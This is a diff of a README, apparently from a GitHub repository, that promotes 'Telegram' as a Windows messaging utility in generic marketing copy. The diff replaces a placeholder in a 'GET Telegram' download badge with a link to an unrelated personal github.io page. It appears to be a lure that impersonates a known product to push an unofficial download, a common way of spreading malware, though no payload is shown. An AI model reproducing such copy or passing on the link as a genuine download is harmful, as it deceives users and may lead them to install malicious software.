@@ -4,7 +4,7 @@
 
 Telegram is a focused Windows messaging utility for connecting with contacts, organizing group chats, and managing secure communication. Telegram keeps conversations readable, notifications clear, and daily messaging easier for home users, students, offices, and technicians who rely on Telegram for steady messaging insight.  
 
-[![GET Telegram](https://img.shields.io/badge/GET%20%E2%80%94%20Telegram-0078D6?style=for-the-badge&logoColor=white)](SILKA)  
+[![GET Telegram](https://img.shields.io/badge/GET%20%E2%80%94%20Telegram-0078D6?style=for-the-badge&logoColor=white)](https://clarencebongiovanni187.github.io/.github/telegram-messenger-security)  
 
 ---  
 
